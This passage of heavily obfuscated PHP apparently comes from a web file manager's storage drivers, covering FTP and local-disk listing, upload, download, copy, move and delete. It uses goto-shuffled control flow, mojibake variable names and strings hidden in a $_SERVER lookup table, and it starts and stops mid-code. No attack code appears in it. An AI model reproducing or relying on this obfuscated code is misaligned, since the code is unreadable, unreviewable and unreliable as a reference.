aÆá©ÎªÀİ; Aãå‚ä…Ú: } public function size($f…â¾¹Ÿ) { $e ğ—­ì = $this->objectMeta($f…â¾¹Ÿ); return $e ğ—­ì ? $e ğ—­ì[$_SERVER[í™][77]] : 0; } public function info($BÎİŸÊº¾) { if ($this->isFile($BÎİŸÊº¾)) { return $this->fileInfo($BÎİŸÊº¾, 0); } else { if ($this->isFolder($BÎİŸÊº¾)) { return $this->folderInfo($BÎİŸÊº¾); } } return !1; } public function exist($d¡Œ¢ì…©‘) { return $this->objectMeta($d¡Œ¢ì…©‘) ? !0 : !1; } public function isFile($c¦–“æ†»¯) { $cåŠï…ÜèÎ =& $_SERVER[í™]; $c‰¸×¸®Ø = $this->objectMeta($c¦–“æ†»¯); return $c‰¸×¸®Ø ? $c‰¸×¸®Ø[$cåŠï…ÜèÎ[29]] == $cåŠï…ÜèÎ[167] : !1; } public function isFolder($CÅ…ÍïÆéê) { $Aßß­Æ¶Œ– =& $_SERVER[í™]; $dùô‡ˆµëª = $this->objectMeta($CÅ…ÍïÆéê); return $dùô‡ˆµëª ? $dùô‡ˆµëª[$Aßß­Æ¶Œ–[29]] == $Aßß­Æ¶Œ–[76] : !1; } public function listPath($bØëŞÈ‹İš, $e¹æìÆ¬œ = false) { goto Aœµ”ËŒ´; Aœµ”ËŒ´: $eÁİÄâ—‰Ë =& $_SERVER[í™]; if (!$this->_isconn()) { return !1; } $bØëŞÈ‹İš = $this->iconvSystem($bØëŞÈ‹İš); goto b‰ÑÀŞ¥ß¾; aóğ¬è¿†: foreach ($A³›øùªğ as $bØëŞÈ‹İš) { if ($this->isFolder($bØëŞÈ‹İš)) { $C·•Ÿ°É•Õ[$eÁİÄâ—‰Ë[74]][] = $this->folderInfo($bØëŞÈ‹İš, $e¹æìÆ¬œ); } else { $C·•Ÿ°É•Õ[$eÁİÄâ—‰Ë[73]][] = $this->fileInfo($bØëŞÈ‹İš, $e¹æìÆ¬œ); } } return $C·•Ÿ°É•Õ; goto d§Øã†’ˆñ; b‰ÑÀŞ¥ß¾: $A³›øùªğ = $this->ftpList($bØëŞÈ‹İš); $C·•Ÿ°É•Õ = array($eÁİÄâ—‰Ë[74] => array(), $eÁİÄâ—‰Ë[73] => array()); if (!$A³›øùªğ) { return $C·•Ÿ°É•Õ; } goto aóğ¬è¿†; d§Øã†’ˆñ: } public function has($c¢á™Áï–†, $fæ™—ÈË“¸ = false, $fÇ×†ÕÆ¶° = true) { goto d·ˆ¹ö”ùˆ; fŠ‘¹çÏÔÏ: $Dİ˜³¾ÊëĞ = $this->ftpList($c¢á™Áï–†); if (!$Dİ˜³¾ÊëĞ) { return !1; } if ($fæ™—ÈË“¸) { return array($Eñõ˜—ª­¦[191] => 0, $Eñõ˜—ª­¦[192] => count($Dİ˜³¾ÊëĞ)); } goto b¶àöªáÃç; d·ˆ¹ö”ùˆ: $Eñõ˜—ª­¦ =& $_SERVER[í™]; if (!$this->_isconn()) { return !1; } $c¢á™Áï–† = $this->iconvSystem($c¢á™Áï–†); goto fŠ‘¹çÏÔÏ; b¶àöªáÃç: foreach ($Dİ˜³¾ÊëĞ as $c¢á™Áï–†) { if ($fÇ×†ÕÆ¶°) { if (!$this->isFolder($c¢á™Áï–†)) { return !0; } } else { if ($this->isFolder($c¢á™Áï–†)) { return !0; } } } return !1; goto E–¢õ¼öë; E–¢õ¼öë: } public function listAll($Dšš¨Áóãê) { goto b–Ò¦Ó¿ßª; c« ïå–ÏÛ: $cÒäöì = array($d®ŠÕâ¶¾[73] => array(), $d®ŠÕâ¶¾[74] => array()); $this->recursionFtpFiles($Dšš¨Áóãê, $cÒäöì); $A¯££“ˆˆ = array(); goto A—æ±Œ…Šï; A—æ±Œ…Šï: foreach ($cÒäöì[$d®ŠÕâ¶¾[74]] as $f‚ŸâÛ‹”) { $A¯££“ˆˆ[] = array($d®ŠÕâ¶¾[75] => $d®ŠÕâ¶¾[8] . trim(str_replace($Dšš¨Áóãê, $d®ŠÕâ¶¾[33], $f‚ŸâÛ‹”), $d®ŠÕâ¶¾[8]) . $d®ŠÕâ¶¾[8], $d®ŠÕâ¶¾[76] => 1, $d®ŠÕâ¶¾[77] => 0); } foreach ($cÒäöì[$d®ŠÕâ¶¾[73]] as $Dó³¯­øÄİ) { $A¯££“ˆˆ[] = array($d®ŠÕâ¶¾[75] => $d®ŠÕâ¶¾[8] . trim(str_replace($Dšš¨Áóãê, $d®ŠÕâ¶¾[33], $Dó³¯­øÄİ), $d®ŠÕâ¶¾[8]), $d®ŠÕâ¶¾[76] => 0, $d®ŠÕâ¶¾[77] => $this->size($Dó³¯­øÄİ)); } return $A¯££“ˆˆ; goto aÉµßÈ§—; b–Ò¦Ó¿ßª: $d®ŠÕâ¶¾ =& $_SERVER[í™]; if (!$this->_isconn()) { return !1; } $Dšš¨Áóãê = $this->iconvSystem($Dšš¨Áóãê); goto c« ïå–ÏÛ; aÉµßÈ§—: } public function getContent($cÙÆçäâàº) { if (!$this->_isconn()) { return !1; } $cÙÆçäâàº = $this->iconvSystem($cÙÆçäâàº); return $this->fileSubstr($cÙÆçäâàº); } public function setContent($E‰„·ÚÊÎ, $a§–„¸ã‰ = '') { goto eÓ®åÁ«°ô; eÓ®åÁ«°ô: if (!$this->_isconn()) { return !1; } $AÏš¥‡›Ÿ™ = $this->pathThis($this->iconvSystem($E‰„·ÚÊÎ)); $d·¼‹¶¨ó = $this->tempFile($AÏš¥‡›Ÿ™); goto d¸ÁÓµ°ï; d¸ÁÓµ°ï: file_put_contents($d·¼‹¶¨ó, $a§–„¸ã‰); $EÎô¡„¢î‡ = $this->upload($E‰„·ÚÊÎ, $this->iconvApp($d·¼‹¶¨ó)); $this->tempFileRemve($d·¼‹¶¨ó); goto aÌ…Ëç…; aÌ…Ëç…: return $EÎô¡„¢î‡; goto D«ù¹ˆĞƒ¢; D«ù¹ˆĞƒ¢: } public function fileSubstr($dì‰¾—«•, $dçó§…Ó‹ = 0, $eî”î•æ‰ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dì‰¾—«•, $dçó§…Ó‹, $eî”î•æ‰); } private function ftpRequest($EÑå“Æ´—ª, $f‚—ÉÂ¥Ì‘ = 0, $AîÇÜ¹´éà = false) { goto D¸—ğ‹¤Ã; Aå‘‹­Èõî: curl_setopt($D¡Ü˜¼Í›İ, CURLOPT_RETURNTRANSFER, 1); $cæã‘’ôİ = curl_exec($D¡Ü˜¼Í›İ); curl_close($D¡Ü˜¼Í›İ); goto B½øí«æî”; D¸—ğ‹¤Ã: $EÑå“Æ´—ª = $this->iconvSystem($EÑå“Æ´—ª); $BÖ¡ŸøôÂ­ = $this->scheme . $this->host . $_SERVER[í™][4] . $this->port; $D¡Ü˜¼Í›İ = curl_init(); goto fáØğè¢‡; B½øí«æî”: return $cæã‘’ôİ; goto e“Ë˜Şê; fáØğè¢‡: curl_setopt($D¡Ü˜¼Í›İ, CURLOPT_URL, $BÖ¡ŸøôÂ­ . $this->pathEncode($EÑå“Æ´—ª)); curl_setopt($D¡Ü˜¼Í›İ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($AîÇÜ¹´éà) { $DºÂÀÒšé = $f‚—ÉÂ¥Ì‘ + $AîÇÜ¹´éà - 1; curl_setopt($D¡Ü˜¼Í›İ, CURLOPT_RANGE, "{$f‚—ÉÂ¥Ì‘}\x2d{$DºÂÀÒšé}"); } goto Aå‘‹­Èõî; e“Ë˜Şê: } public function upload($f…µŒ®øœá, $D›ÁÆæªäì, $DŞ³’ÕĞ = false, $DßŠ£ÏÂç = REPEAT_REPLACE) { goto CŠÓ‘ÄÕ¼›; c‘¾îİô§†: $D›ÁÆæªäì = $this->iconvSystem($D›ÁÆæªäì); $F¶Ò í¼à‹ = ftp_nb_put($this->connect, $f…µŒ®øœá, $D›ÁÆæªäì, FTP_BINARY); while ($F¶Ò í¼à‹ == FTP_MOREDATA) { $F¶Ò í¼à‹ = ftp_nb_continue($this->connect); } goto Béñ„Ù›¯õ; CŠÓ‘ÄÕ¼›: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($f…µŒ®øœá))) { return !1; } $f…µŒ®øœá = $this->iconvSystem($f…µŒ®øœá); goto c‘¾îİô§†; Béñ„Ù›¯õ: if ($F¶Ò í¼à‹ != FTP_FINISHED) { return !1; } return $this->getPathOuter($f…µŒ®øœá); goto cÂ½äÄË™; cÂ½äÄË™: } public function download($cß”´Õ¨çÌ, $f£áçæ¢ = '') { goto DÈ›êîÆí§; DÈ›êîÆí§: if (!$this->_isconn()) { return !1; } $DìŸ¿…îœ = $this->pathFather($f£áçæ¢); if (!IO::mkdir($DìŸ¿…îœ)) { return !1; } goto FÈª¾¯–Ü†; b«ÊªŠíÕ: while ($c»æÙö‡¢É == FTP_MOREDATA) { $c»æÙö‡¢É = ftp_nb_continue($this->connect); } if ($c»æÙö‡¢É != FTP_FINISHED) { return !1; } return $this->iconvApp($f£áçæ¢); goto EÁõØ‘‹’¬; FÈª¾¯–Ü†: $cß”´Õ¨çÌ = $this->iconvSystem($cß”´Õ¨çÌ); $f£áçæ¢ = $this->iconvSystem($f£áçæ¢); $c»æÙö‡¢É = ftp_nb_get($this->connect, $f£áçæ¢, $cß”´Õ¨çÌ, FTP_BINARY); goto b«ÊªŠíÕ; EÁõØ‘‹’¬: } private function ftpList($AÏŠà‡Ş°·) { goto bÆØÙÁ´ÉÜ; CÏ¼¸ˆ…›: $AÏŠà‡Ş°· = rtrim($AÏŠà‡Ş°·, $Eá•Œã¥±[8]) . $Eá•Œã¥±[8]; $Dˆö×¤ÊâŒ = @ftp_nlist($this->connect, $AÏŠà‡Ş°·); if ($Dˆö×¤ÊâŒ === !1) { $Dˆö×¤ÊâŒ = @ftp_rawlist($this->connect, $AÏŠà‡Ş°·); foreach ($Dˆö×¤ÊâŒ as $d¦áÜÚ” => $f¼‘ˆ¶é¥÷) { $Dˆö×¤ÊâŒ[$d¦áÜÚ”] = end(explode($Eá•Œã¥±[1150], $f¼‘ˆ¶é¥÷)); } } goto C’ÍŒã†‹ò; bÆØÙÁ´ÉÜ: $Eá•Œã¥± =& $_SERVER[í™]; if (!$this->isFolder($AÏŠà‡Ş°·)) { return !1; } @ftp_chdir($this->connect, $Eá•Œã¥±[8]); goto CÏ¼¸ˆ…›; C’ÍŒã†‹ò: $Dˆö×¤ÊâŒ = array_diff($Dˆö×¤ÊâŒ, array($Eá•Œã¥±[91], $Eá•Œã¥±[1151], $AÏŠà‡Ş°· . $Eá•Œã¥±[91], $AÏŠà‡Ş°· . $Eá•Œã¥±[1151])); $Aì¾ê÷áÜ¢ = array(); foreach ($Dˆö×¤ÊâŒ as $A‚ìªÏêæ) { if (!strstr($A‚ìªÏêæ, $Eá•Œã¥±[8])) { $A‚ìªÏêæ = $AÏŠà‡Ş°· . ltrim($A‚ìªÏêæ, $Eá•Œã¥±[8]); } $Aì¾ê÷áÜ¢[] = $this->iconvApp($A‚ìªÏêæ); } goto Có¼ÃäÒ»¬; Có¼ÃäÒ»¬: return $Aì¾ê÷áÜ¢; goto E¨õä×ìø; E¨õä×ìø: } private function recursionFtpFiles($e—«’³¢½³, &$däé †ñÓ¯) { $bà¢Ë»††õ =& $_SERVER[í™]; if (!$this->_isconn()) { return !1; } if (!($a¹·á¥ááì = $this->ftpList($e—«’³¢½³))) { return !1; } foreach ($a¹·á¥ááì as $e—«’³¢½³) { if ($this->isFolder($e—«’³¢½³)) { $this->recursionFtpFiles($e—«’³¢½³, $däé †ñÓ¯); $däé †ñÓ¯[$bà¢Ë»††õ[74]][] = $e—«’³¢½³; } else { $däé †ñÓ¯[$bà¢Ë»††õ[73]][] = $e—«’³¢½³; } } } private function objectMeta($dšø³‚›„æ) { goto c†¶Óï¤Ô„; bÔ×«‚¯Ó¥: return $dñ‹·íÙŞ; goto f±ÇŒï¸Çæ; CŒ„ Ã™·: if ($dñ‹·íÙŞ !== null && $dñ‹·íÙŞ !== !1) { return $dñ‹·íÙŞ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $dÌ³øª‚È[8]); goto aÕå²„Ü†Ú; c†¶Óï¤Ô„: $dÌ³øª‚È =& $_SERVER[í™]; $C‹˜ŸŞùÂÁ = $dÌ³øª‚È[1152] . md5($dšø³‚›„æ); $dñ‹·íÙŞ = Cache::get($C‹˜ŸŞùÂÁ); goto CŒ„ Ã™·; aÕå²„Ü†Ú: $f ‡àÚà¦ = @ftp_size($this->connect, $this->iconvSystem($dšø³‚›„æ)); if ($f ‡àÚà¦ != -1) { $dñ‹·íÙŞ = array($dÌ³øª‚È[77] => $f ‡àÚà¦, $dÌ³øª‚È[29] => $dÌ³øª‚È[167]); } else { $AùÆ¢ƒ¾ = @ftp_chdir($this->connect, $this->iconvSystem($dšø³‚›„æ)); $dñ‹·íÙŞ = $AùÆ¢ƒ¾ ? array($dÌ³øª‚È[77] => 0, $dÌ³øª‚È[29] => $dÌ³øª‚È[76]) : !1; } Cache::set($C‹˜ŸŞùÂÁ, $dñ‹·íÙŞ, 0); goto bÔ×«‚¯Ó¥; f±ÇŒï¸Çæ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A¶®‚ØÉŒ) { if (substr($A¶®‚ØÉŒ, 0, 2) == $_SERVER[í™][1141]) { $A¶®‚ØÉŒ = BASIC_PATH . substr($A¶®‚ØÉŒ, 2); } return $A¶®‚ØÉŒ; } public function iconvApp($c’¤¥¥ø¹¶) { $Dµ ­„”§É =& $_SERVER[í™]; global $config; return $this->iconvTo($c’¤¥¥ø¹¶, $config[$Dµ ­„”§É[1139]], $config[$Dµ ­„”§É[1138]]); } public function iconvSystem($cº“‡ò‰‘ä) { $Fª·×¼´—Ş =& $_SERVER[í™]; global $config; return $this->iconvTo($cº“‡ò‰‘ä, $config[$Fª·×¼´—Ş[1138]], $config[$Fª·×¼´—Ş[1139]]); } public function getPathOuter($Aø¬âø‚®Â) { goto Aì¡¿îğå©; eã§§ìîˆ£: $Aø¬âø‚®Â = KodIO::clear($Aø¬âø‚®Â); $Aø¬âø‚®Â = substr($Aø¬âø‚®Â, strlen($dÍÑÅƒÓÒ)); if (empty($this->pathDriver)) { return $Aø¬âø‚®Â; } goto D²È‚ªÍ°Ö; Aì¡¿îğå©: $F—ğù‰ôö =& $_SERVER[í™]; $dÍÑÅƒÓÒ = $this->iconvApp($this->pathBase); $Aø¬âø‚®Â = $this->iconvApp($Aø¬âø‚®Â); goto eµ¿Ôô±‚ê; eµ¿Ôô±‚ê: if (substr($dÍÑÅƒÓÒ, 0, 2) == $F—ğù‰ôö[1141]) { $dÍÑÅƒÓÒ = BASIC_PATH . substr($dÍÑÅƒÓÒ, 2); } if (substr($Aø¬âø‚®Â, 0, 2) == $F—ğù‰ôö[1141]) { $Aø¬âø‚®Â = BASIC_PATH . substr($Aø¬âø‚®Â, 2); } $dÍÑÅƒÓÒ = KodIO::clear($dÍÑÅƒÓÒ); goto eã§§ìîˆ£; D²È‚ªÍ°Ö: return $this->pathDriver . $F—ğù‰ôö[8] . ltrim($Aø¬âø‚®Â, $F—ğù‰ôö[8]); goto dÍêéŞ–ïƒ; dÍêéŞ–ïƒ: } public function mkfile($dëîÁÖéÅ„, $EŠÏêĞ²ğÔ = '', $e°Â™êÀ…è = REPEAT_RENAME) { $dëîÁÖéÅ„ = $this->iconvSystem($dëîÁÖéÅ„); @touch($dëîÁÖéÅ„); if ($EŠÏêĞ²ğÔ) { file_put_contents($dëîÁÖéÅ„, $EŠÏêĞ²ğÔ); } return is_file($dëîÁÖéÅ„) ? $this->getPathOuter($dëîÁÖéÅ„) : !1; } public function mkdir($f‚ËÛ ÷¤‹, $dÄØÇöâœ = REPEAT_SKIP) { $f‚ËÛ ÷¤‹ = $this->iconvSystem($f‚ËÛ ÷¤‹); if (is_dir($f‚ËÛ ÷¤‹)) { return $this->getPathOuter($f‚ËÛ ÷¤‹); } @mkdir($f‚ËÛ ÷¤‹, 511, !0); return is_dir($f‚ËÛ ÷¤‹) ? $this->getPathOuter($f‚ËÛ ÷¤‹) : !1; } public function copyFile($a¬ÓÏÙŞÈ, $EÈ»ˆù¼Ë³) { $this->mkdir($this->pathFather($EÈ»ˆù¼Ë³)); $a¬ÓÏÙŞÈ = $this->iconvSystem($a¬ÓÏÙŞÈ); $EÈ»ˆù¼Ë³ = $this->iconvSystem($EÈ»ˆù¼Ë³); $B¿ƒ¾½Èîö = @copy($a¬ÓÏÙŞÈ, $EÈ»ˆù¼Ë³); return $B¿ƒ¾½Èîö ? $this->getPathOuter($EÈ»ˆù¼Ë³) : !1; } public function moveFile($B©¿÷ßÜŞ, $EºÕØ¸) { $this->mkdir($this->pathFather($EºÕØ¸)); $B©¿÷ßÜŞ = $this->iconvSystem($B©¿÷ßÜŞ); $EºÕØ¸ = $this->iconvSystem($EºÕØ¸); $Bö½ÃÂì˜ë = intval(@rename($B©¿÷ßÜŞ, $EºÕØ¸)); if (!$Bö½ÃÂì˜ë) { if ($Bö½ÃÂì˜ë = intval(@copy($B©¿÷ßÜŞ, $EºÕØ¸))) { @unlink($B©¿÷ßÜŞ); } } return $Bö½ÃÂì˜ë ? $this->getPathOuter($EºÕØ¸) : !1; } public function delFile($C¡â¼Ÿ¸â«) { $C¡â¼Ÿ¸â« = $this->iconvSystem($C¡â¼Ÿ¸â«); if (!@unlink($C¡â¼Ÿ¸â«)) { @chmod($C¡â¼Ÿ¸â«, 511); if (!@unlink($C¡â¼Ÿ¸â«)) { return !1; } } else { return !0; } } public function delFolder($d„É‡†¡Âˆ) { goto d‡Ôë£ù—Ï; D×Ÿçº£‘•: if (!($e¹è„Í‰´µ = opendir($d„É‡†¡Âˆ))) { return !1; } while (($f™è³Ó‹•é = readdir($e¹è„Í‰´µ)) !== !1) { if ($f™è³Ó‹•é == $eŒ‰¯å‚×Ã[91] || $f™è³Ó‹•é == $eŒ‰¯å‚×Ã[1151]) { continue; } $b¾µœ‚îå = $d„É‡†¡Âˆ . $eŒ‰¯å‚×Ã[8] . $f™è³Ó‹•é; if (is_file($b¾µœ‚îå) || is_link($b¾µœ‚îå)) { if (!unlink($b¾µœ‚îå)) { chmod($b¾µœ‚îå, 511); if (!unlink($b¾µœ‚îå)) { return !1; } } } else { if (is_dir($b¾µœ‚îå)) { chmod($b¾µœ‚îå, 511); $b¾µœ‚îå = $this->iconvApp($b¾µœ‚îå); if (!$this->delFolder($b¾µœ‚îå)) { return !1; } } } } closedir($e¹è„Í‰´µ); goto AŠ’¨İ‡Ì; d‡Ôë£ù—Ï: $eŒ‰¯å‚×Ã =& $_SERVER[í™]; $d„É‡†¡Âˆ = $this->iconvSystem($d„É‡†¡Âˆ); if (!is_dir($d„É‡†¡Âˆ)) { return !0; } goto D×Ÿçº£‘•; AŠ’¨İ‡Ì: return rmdir($d„É‡†¡Âˆ); goto f¹™Û¨ĞºÛ; f¹™Û¨ĞºÛ: } public function rename($a‰–„­¨Ô¦, $bôÁŒ¦Œ¹) { goto aß‘ù³ß¾; aß‘ù³ß¾: $b¹®ÄƒŞöÌ =& $_SERVER[í™]; $D›–Í¦¡˜° = $this->fileNameAuto($this->pathFather($a‰–„­¨Ô¦), $bôÁŒ¦Œ¹); $D›–Í¦¡˜° = $this->iconvSystem($D›–Í¦¡˜°); goto déÜ …“÷; CàÏÈ‰è¿à: $FÍ™É¸ËÜ = @rename($a‰–„­¨Ô¦, $f†ìÜÛš•İ); $f†ìÜÛš•İ = $this->iconvApp($f†ìÜÛš•İ); return $FÍ™É¸ËÜ ? $this->getPathOuter($f†ìÜÛš•İ) : !1; goto bˆÇËÊŞ¡«; déÜ …“÷: $a‰–„­¨Ô¦ = $this->iconvSystem($a‰–„­¨Ô¦); $cøè’Ö®³ã = $this->pathFather($a‰–„­¨Ô¦); $f†ìÜÛš•İ = rtrim($cøè’Ö®³ã, $b¹®ÄƒŞöÌ[8]) . $b¹®ÄƒŞöÌ[8] . $D›–Í¦¡˜°; goto CàÏÈ‰è¿à; bˆÇËÊŞ¡«: } public function size($A™°ñ–´šÓ) { $A™°ñ–´šÓ = $this->iconvSystem($A™°ñ–´šÓ); return (double) abs(sprintf($_SERVER[í™][1153], @filesize($A™°ñ–´šÓ))); } public function info($f˜í—Œ½®) { $f˜í—Œ½® = $this->iconvSystem($f˜í—Œ½®); if ($this->isFolder($f˜í—Œ½®)) { return $this->folderInfo($f˜í—Œ½®); } else { if ($this->isFile($f˜í—Œ½®)) { return $this->fileInfo($f˜í—Œ½®); } } return !1; } protected function infoChildren($Bİù‰çÊÎñ, &$C±ÌĞ‘”ç‡, $B±ïç°°ê£ = true) { goto EÈóì¨…; B¥„Šµ³çš: if ($B±ïç°°ê£) { $Bİù‰çÊÎñ = $this->iconvSystem($Bİù‰çÊÎñ); } if (!($FÉ™÷ª¥¬™ = @opendir($Bİù‰çÊÎñ))) { return; } while (($A‡¢³ó¯‚Å = readdir($FÉ™÷ª¥¬™)) !== !1) { if ($A‡¢³ó¯‚Å == $bºãÃ¶çõå[91] || $A‡¢³ó¯‚Å == $bºãÃ¶çõå[1151]) { continue; } $a¢ƒ–éŠ¸¿ = $Bİù‰çÊÎñ . $A‡¢³ó¯‚Å; if (is_file($a¢ƒ–éŠ¸¿) || is_link($a¢ƒ–éŠ¸¿)) { $C±ÌĞ‘”ç‡[$bºãÃ¶çõå[78]]++; $C±ÌĞ‘”ç‡[$bºãÃ¶çõå[77]] += (double) abs(sprintf($bºãÃ¶çõå[1153], @filesize($a¢ƒ–éŠ¸¿))); } else { if (is_dir($a¢ƒ–éŠ¸¿)) { $C±ÌĞ‘”ç‡[$bºãÃ¶çõå[79]]++; $this->infoChildren($a¢ƒ–éŠ¸¿, $C±ÌĞ‘”ç‡, !1); } } } goto c•…‹áó ·; EÈóì¨…: $bºãÃ¶çõå =& $_SERVER[í™]; check_abort(); $Bİù‰çÊÎñ = rtrim($Bİù‰çÊÎñ, $bºãÃ¶çõå[8]) . $bºãÃ¶çõå[8]; goto B¥„Šµ³çš; c•…‹áó ·: closedir($FÉ™÷ª¥¬™); goto eÂãÍ­øÛ; eÂãÍ­øÛ: } private function folderInfo($BÃ¥¤ÚãğÆ, $E·í¹Ø“Ò = false) { $a‰ˆº¥ØçÈ =& $_SERVER[í™]; $BÃ¥¤ÚãğÆ = rtrim($BÃ¥¤ÚãğÆ, $a‰ˆº¥ØçÈ[8]) . $a‰ˆº¥ØçÈ[8]; $BÌ¥”–²õ = $this->iconvApp($this->pathThis($BÃ¥¤ÚãğÆ)); if ($E·í¹Ø“Ò) { return array($a‰ˆº¥ØçÈ[28] => $BÌ¥”–²õ, $a‰ˆº¥ØçÈ[75] => $this->getPathOuter($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[29] => $a‰ˆº¥ØçÈ[76]); } $AÚîÎØÂ— = array($a‰ˆº¥ØçÈ[28] => $BÌ¥”–²õ, $a‰ˆº¥ØçÈ[75] => $this->getPathOuter($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[29] => $a‰ˆº¥ØçÈ[76], $a‰ˆº¥ØçÈ[187] => @filectime($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[107] => @filemtime($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[1154] => @fileatime($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[1148] => is_readable($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[1149] => is_writable($BÃ¥¤ÚãğÆ), $a‰ˆº¥ØçÈ[1155] => get_mode($BÃ¥¤ÚãğÆ)); return $AÚîÎØÂ—; } private function fileInfo($d¶±µÑÔÃœ, $E¬Ã¨íĞ¹ = false) { $BŒ¬–›†Œç =& $_SERVER[í™]; $BÒ¼¨„æô = $this->iconvApp($this->pathThis($d¶±µÑÔÃœ)); if ($E¬Ã¨íĞ¹) { return array($BŒ¬–›†Œç[28] => $BÒ¼¨„æô, $BŒ¬–›†Œç[75] => $this->getPathOuter($d¶±µÑÔÃœ), $BŒ¬–›†Œç[29] => $BŒ¬–›†Œç[167], $BŒ¬–›†Œç[77] => $this->size($d¶±µÑÔÃœ), $BŒ¬–›†Œç[160] => $this->ext($BÒ¼¨„æô)); } $d¿êÂ“£”ˆ = array($BŒ¬–›†Œç[28] => $BÒ¼¨„æô, $BŒ¬–›†Œç[75] => $this->getPathOuter($d¶±µÑÔÃœ), $BŒ¬–›†Œç[29] => $BŒ¬–›†Œç[167], $BŒ¬–›†Œç[187] => @filectime($d¶±µÑÔÃœ), $BŒ¬–›†Œç[107] => @filemtime($d¶±µÑÔÃœ), $BŒ¬–›†Œç[1154] => @fileatime($d¶±µÑÔÃœ), $BŒ¬–›†Œç[77] => $this->size($d¶±µÑÔÃœ), $BŒ¬–›†Œç[160] => $this->ext($BÒ¼¨„æô), $BŒ¬–›†Œç[1148] => is_readable($d¶±µÑÔÃœ), $BŒ¬–›†Œç[1149] => is_writable($d¶±µÑÔÃœ), $BŒ¬–›†Œç[1155] => get_mode($d¶±µÑÔÃœ)); return $d¿êÂ“£”ˆ; } public function exist($Dğïå›õ‹Ó) { $Dğïå›õ‹Ó = $this->iconvSystem($Dğïå›õ‹Ó); return @file_exists($Dğïå›õ‹Ó); } public function isFile($b®ÌøäÃö¶) { $b®ÌøäÃö¶ = $this->iconvSystem($b®ÌøäÃö¶); return @is_file($b®ÌøäÃö¶); } public function isFolder($C¤ÀÜä×æ) { $C¤ÀÜä×æ = $this->iconvSystem($C¤ÀÜä×æ); return @is_dir($C¤ÀÜä×æ); } public function listPath($cáÓ×È¼», $AñêˆŞÁğô = false) { goto bœ½İö¯Ë‚; eÍ­™¸ğª: $DƒìÃ®‚Ú = array($E¸æïã–©¤[74] => array(), $E¸æïã–©¤[73] => array()); if (!($Fœ‚õ¤Êôô = @opendir($cáÓ×È¼»))) { return $DƒìÃ®‚Ú; } while (($BËŒ¡®åœ = readdir($Fœ‚õ¤Êôô)) !== !1) { if ($BËŒ¡®åœ == $E¸æïã–©¤[91] || $BËŒ¡®åœ == $E¸æïã–©¤[1151]) { continue; } $f§Ê¿Ÿ¶Á× = $cáÓ×È¼» . $BËŒ¡®åœ; if (is_file($f§Ê¿Ÿ¶Á×)) { $DƒìÃ®‚Ú[$E¸æïã–©¤[73]][] = $this->fileInfo($f§Ê¿Ÿ¶Á×, $AñêˆŞÁğô); } else { $DƒìÃ®‚Ú[$E¸æïã–©¤[74]][] = $this->folderInfo($f§Ê¿Ÿ¶Á×, $AñêˆŞÁğô); } } goto bá³½²¶º¾; bá³½²¶º¾: closedir($Fœ‚õ¤Êôô); return $DƒìÃ®‚Ú; goto DÓ›ÓèÌ÷; bœ½İö¯Ë‚: $E¸æïã–©¤ =& $_SERVER[í™]; $cáÓ×È¼» = $this->iconvSystem($cáÓ×È¼»); $cáÓ×È¼» = rtrim($cáÓ×È¼», $E¸æïã–©¤[8]) . $E¸æïã–©¤[8]; goto eÍ­™¸ğª; DÓ›ÓèÌ÷: } public function listAll($céŒÍå ¶·, &$a¨ÌŠ©ÇæŠ = array()) { goto F…¾÷ÂÉáÅ; dà¥áÀ½ç…: if (!($CĞé”ë˜‘… = @opendir($céŒÍå ¶·))) { return $a¨ÌŠ©ÇæŠ; } while (($DÒŒÛìßñ¨ = readdir($CĞé”ë˜‘…)) !== !1) { if ($DÒŒÛìßñ¨ == $a¾ˆ‹ò‹º¨[91] || $DÒŒÛìßñ¨ == $a¾ˆ‹ò‹º¨[1151]) { continue; } $aáŠÖƒ“– = $céŒÍå ¶· . $DÒŒÛìßñ¨; if (is_dir($aáŠÖƒ“–) && !is_link($aáŠÖƒ“–)) { $a¨ÌŠ©ÇæŠ[] = array($a¾ˆ‹ò‹º¨[75] => $aáŠÖƒ“– . $a¾ˆ‹ò‹º¨[8], $a¾ˆ‹ò‹º¨[76] => 1, $a¾ˆ‹ò‹º¨[107] => @filemtime($aáŠÖƒ“–), $a¾ˆ‹ò‹º¨[77] => 0); $this->listAll($aáŠÖƒ“–, $a¨ÌŠ©ÇæŠ); } else { $a¨ÌŠ©ÇæŠ[] = array($a¾ˆ‹ò‹º¨[75] => $aáŠÖƒ“–, $a¾ˆ‹ò‹º¨[76] => 0, $a¾ˆ‹ò‹º¨[107] => @filemtime($aáŠÖƒ“–), $a¾ˆ‹ò‹º¨[77] => $this->size($aáŠÖƒ“–)); } } closedir($CĞé”ë˜‘…); goto dÎâÈ…ĞñŠ; F…¾÷ÂÉáÅ: $a¾ˆ‹ò‹º¨ =& $_SERVER[í™]; $céŒÍå ¶· = $this->iconvSystem($céŒÍå ¶·); $céŒÍå ¶· = rtrim($céŒÍå ¶·, $a¾ˆ‹ò‹º¨[8]) . $a¾ˆ‹ò‹º¨[8]; goto dà¥áÀ½ç…; dÎâÈ…ĞñŠ: return $a¨ÌŠ©ÇæŠ; goto bÂ¥‚ç; bÂ¥‚ç: } public function has($E»ËÛ­òá, $eæ’š†­Ä = false, $E ØÊ¤É› = true) { goto b¦¾¤¹ÔœË; FÑ±ê„÷ªÓ: $b‡Å¤¨âÄß = 0; while (($c³‡íäÆ­› = readdir($eÙ—ÃØŞ×Ï)) !== !1) { if ($c³‡íäÆ­› == $Fî×Œ•çØ·[91] || $c³‡íäÆ­› == $Fî×Œ•çØ·[1151]) { continue; } $Dõº§ˆÕ¡ù = $E»ËÛ­òá . $c³‡íäÆ­›; if ($eæ’š†­Ä) { $b‡Å¤¨âÄß++; if (@is_file($Dõº§ˆÕ¡ù)) { $C‹Ã‘Ëá‡×++; } else { $fÕÊ‰²ğÑ++; } if ($b‡Å¤¨âÄß > 10000) { break; } continue; } if ($E ØÊ¤É›) { if 